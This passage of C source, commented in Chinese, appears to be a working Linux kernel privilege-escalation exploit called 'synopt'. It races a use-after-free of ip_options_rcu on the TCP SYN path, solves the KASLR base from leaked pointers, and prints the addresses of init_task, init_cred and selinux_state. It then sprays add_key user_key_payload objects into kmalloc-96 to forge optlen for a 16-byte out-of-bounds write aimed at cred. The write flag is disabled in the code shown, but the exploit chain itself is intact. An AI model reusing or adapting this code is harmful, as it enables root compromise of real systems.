 * 关键：找一个同样落在 kmalloc-96、而且能把数据写到 optlen 那个位置的对象。
 *
 *   struct ip_options_rcu          user_key_payload（add_key "user" 类型）
 *   +0x00 rcu_head (16)            +0x00 rcu_head (16)
 *   +0x10 struct ip_options        +0x10 datalen (u16)
 *   +0x18 optlen   (u8)      <---> +0x18 data[0]      ← 完全重合
 *   +0x20 __data[40]         <---> +0x20 data[8..]    ← 完全重合
 *
 * user_preparse 里是 __kmalloc(datalen + 0x18)，datalen=72 时正好 96 字节，
 * 落进 kmalloc-96。于是：
 *   data[0]  = 我们想要的假 optlen（比如 56）
 *   data[8..]= 我们想要的 __data 内容
 *
 * 对象被释放后，用 add_key 喷一批，槽位被 user_key_payload 占住；重传 SYN
 * 那条路径第二次读 optlen 就拿到 56，memcpy 写穿 16 字节。
 *
 * ---- 为什么默认不启用 ----
 *
 * CONFIG_PANIC_ON_OOPS=y，写错一个字节就是重启。所以这个阶段：
 *   - 只解基址、只打印要用的地址（不写内核）；
 *   - 真要发写请求必须显式 --allow-write；
 *   - 越界长度控制在 16 字节，不跨页。
 */

static uint64_t g_base;          /* 内核 _text 基址 */
static int g_allow_write;

/* ---- 基址求解 ----
 *
 * 泄露阶段给出的是 .text 里的地址候选，但不知道它具体是哪个符号。
 * 用自洽性检查：候选 - 已知站点偏移 必须落在 2MiB 对齐的 _text 上
 * （KASLR slide 是 2MiB 粒度），且仍在 ffffff80.. 段内。 */
struct site {
    const char *name;
    uint64_t off;
};

static const struct site g_sites[] = {
    {"ip_options_build",        O_IP_OPTIONS_BUILD},
    {"ip_build_and_send_pkt",   O_IP_BUILD_AND_SEND_PKT},
    {"tcp_v4_send_synack",      O_TCP_V4_SEND_SYNACK},
    {"tcp_v4_syn_recv_sock",    O_TCP_V4_SYN_RECV_SOCK},
    {"inet_csk_route_req",      O_INET_CSK_ROUTE_REQ},
    {"inet_sock_destruct",      O_INET_SOCK_DESTRUCT},
    {"tcp_v4_reqsk_destructor", O_TCP_V4_REQSK_DESTRUCTOR},
    {"tcp_make_synack",         O_TCP_MAKE_SYNACK},
};

#define N_SITES (sizeof(g_sites) / sizeof(g_sites[0]))
#define KASLR_ALIGN 0x200000ULL

static int solve_base(const uint64_t *cand, int n) {
    for (int i = 0; i < n; i++) {
        for (unsigned j = 0; j < N_SITES; j++) {
            if (cand[i] < g_sites[j].off) continue;
            uint64_t base = cand[i] - g_sites[j].off;
            if ((base & (KASLR_ALIGN - 1)) != 0) continue;
            if ((base >> 40) != 0xffffffULL) continue;
            say("[base] 候选 %#llx 命中站点 %s", (unsigned long long)cand[i], g_sites[j].name);
            say("[base] _text = %#llx", (unsigned long long)base);
            g_base = base;
            return 0;
        }
    }
    return 1;
}

/* ---- 写原语说明 ---- */

static void report_write_plan(void) {
    say("[write] 假对象 optlen = %d（第一次预留按 40 算，memcpy 会写 %d 字节）",
        WRITE_OPTLEN, WRITE_OPTLEN);
    say("[write] 越界 = %d 字节，落在 skb 线性数据之后", WRITE_OPTLEN - OPT_MAXLEN);
    say("[write] 目的地址由内核算：skb->head + network_header + 20");
    say("[write] 对象来源：add_key(user) datalen=%d → kmalloc-96", KEY_DATALEN);
    say("[write] optlen 位置 +0x18 与 user_key_payload.data[0] 重合");
}

static int phase_root(struct hit_ctx *hit) {
    say("root 阶段：解 _text 基址");

    uint64_t cand[8];
    int n = find_text_candidates(&hit->s, cand, 8);
    if (n == 0) {
        say("[!] 没有内核指针候选；先跑 leak 拿到候选再来");
        return 1;
    }
    for (int i = 0; i < n; i++) say("  候选[%d] = %#llx", i, (unsigned long long)cand[i]);
    if (solve_base(cand, n) != 0) {
        say("[!] 候选对不上已知站点，基址解不出来");
        return 1;
    }

    say("[OK] slide = %#llx", (unsigned long long)(g_base - 0xffffffc080000000ULL));
    say("[sym] ip_options_build      = %#llx", (unsigned long long)(g_base + O_IP_OPTIONS_BUILD));
    say("[sym] ip_build_and_send_pkt = %#llx", (unsigned long long)(g_base + O_IP_BUILD_AND_SEND_PKT));
    say("[sym] init_task             = %#llx", (unsigned long long)(g_base + O_INIT_TASK));
    say("[sym] init_cred             = %#llx", (unsigned long long)(g_base + O_INIT_CRED));
    say("[sym] selinux_state         = %#llx", (unsigned long long)(g_base + O_SELINUX_STATE));

    report_write_plan();

    /* 先验证 add_key 这条路通不通，不管开不开启写入。 */
    int made = key_spray(WRITE_OPTLEN, 0x53570000u);
    if (made < 0) {
        say("[!] add_key 不可用，写原语无法构造");
        return 1;
    }
    say("[key] 喷了 %d 个 user key（每个 96 字节，kmalloc-96）", made);
    key_spray_free();
    say("[key] 已释放");

    if (!g_allow_write) {
        /* 只探测模式到这里就算完成：基址解出来了、add_key 通路验证过了。
         * 返回 0 让上层知道“探测成功”，而不是“失败”。 */
        say("[OK] 探测完成（未写内核）。要真的写请选「允许写入」");
        return 0;
    }

    /* 真正的写：把喷淋源换成 add_key，再打一轮竞态。
     *
     * 这一轮里被释放的槽位会被 user_key_payload 占住（data[0]=WRITE_OPTLEN），
     * 重传 SYN 那条路径第二次读 optlen 就拿到 56，memcpy 写穿 16 字节。 */
    say("[write] 开启写入：喷淋源切到 add_key，重新打一轮竞态");
    g_spray_kind = SPRAY_KEY;
    g_fake_optlen = WRITE_OPTLEN;

    struct hit_ctx w;
    int rc = phase_race(&w);
    if (rc != 0) {
        say("[write] 没命中，内核没有被写");
        key_spray_free();
        g_spray_kind = SPRAY_IPOPT;
        return 1;
    }
    say("[write] 命中：越界写已发生（%d 字节）", WRITE_OPTLEN - OPT_MAXLEN);
    say("[write] 现在内核里多了 16 字节脏数据；请检查 dmesg 是否报错");
    key_spray_free();
    g_spray_kind = SPRAY_IPOPT;
    return 0;
}

int main(int argc, char **argv) {
    const char *phase = "race";
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--tun-fd") && i + 1 < argc) g_tun = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--target") && i + 1 < argc) g_dst = inet_addr(argv[++i]);
        else if (!strcmp(argv[i], "--src") && i + 1 < argc) g_src = inet_addr(argv[++i]);
        else if (!strcmp(argv[i], "--port") && i + 1 < argc) g_port = (uint16_t)atoi(argv[++i]);
        else if (!strcmp(argv[i], "--rounds") && i + 1 < argc) g_rounds = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--phase") && i + 1 < argc) phase = argv[++i];
        else if (!strcmp(argv[i], "--verbose")) g_verbose = 1;
        /* 写路径暂时硬关闭：用户实测出现重启循环，在写原语定向到 cred
         * 之前不能真的动内核。参数保留但不再生效，避免旧脚本误开。 */
        else if (!strcmp(argv[i], "--allow-write")) g_allow_write = 0;
    }

    srand((unsigned)time(NULL) ^ (unsigned)getpid());
    if (g_tun < 0) { FAIL("缺少 --tun-fd"); return 2; }
    say("synopt: release=%s tun=%d dst=%08x port=%u phase=%s", SYNOPT_RELEASE, g_tun, g_dst, g_port, phase);

    /* 先真的在目标端口 listen：没有监听套接字，内核不会为 SYN 建请求 sock。 */
    g_listen_fd = listen_open(g_port);
    if (g_listen_fd < 0) {
        FAIL("监听端口失败，无法进入 tcp_conn_request");
        return 2;
    }

    pthread_t th;
    if (pthread_create(&th, NULL, reader, NULL) != 0) { FAIL("读线程起不来"); return 2; }

    /* 先确认 tun 的投递方向通不通，再谈 TCP。
     *
     * 即使 ICMP 不通也继续跑一小段 TCP：万一只是 ICMP 被过滤，TCP 反而能通，
     * 这样一次运行就能同时拿到两个判据，不用再来一轮。 */
    if (channel_selftest() != 0) {
        say("[!] 通道自检失败，仍用缩短的轮数跑一段 TCP 以收集对照数据");
        if (g_rounds > 50) g_rounds = 50;
    }

    int rc;
    if (!strcmp(phase, "probe")) {
        rc = phase_probe();
    } else {
        struct hit_ctx hit;
        rc = phase_race(&hit);
        if (rc == 0 && !strcmp(phase, "leak")) {
            rc = phase_leak(&hit);
        } else if (rc == 0 && !strcmp(phase, "root")) {
            /* root 阶段：先解基址，再按 --allow-write 决定是否真的写。 */
            rc = phase_root(&hit);
        }
    }

    say("统计: tx=%lu rx=%lu synack=%lu hit=%lu clear=%lu none=%lu raw=%lu icmp=%lu",
        g_tx, g_rx, g_synack, g_hit, g_clear, g_none, g_raw_rx, g_icmp_rx);
    g_running = 0;
    if (g_listen_fd >= 0) { close(g_listen_fd); g_listen_fd = -1; }
    pthread_join(th, NULL);
    if (rc == 0) say("OK");
    return rc;
}
